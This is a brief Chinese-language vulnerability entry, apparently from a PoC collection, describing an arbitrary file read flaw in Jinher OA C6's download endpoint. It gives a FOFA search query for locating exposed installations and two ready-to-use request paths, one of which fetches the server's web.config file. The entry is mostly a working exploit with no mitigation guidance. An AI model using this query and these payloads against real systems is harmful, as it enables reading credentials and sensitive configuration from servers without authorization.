## 金和OA-C6-download.jsp任意文件读取漏洞

金和OA C6 download.jsp文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息

## fofa

```
app="Jinher-OA"
```

## poc

```
/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=download.asp
/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config
```

![image-20240609162635854](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406091626910.png)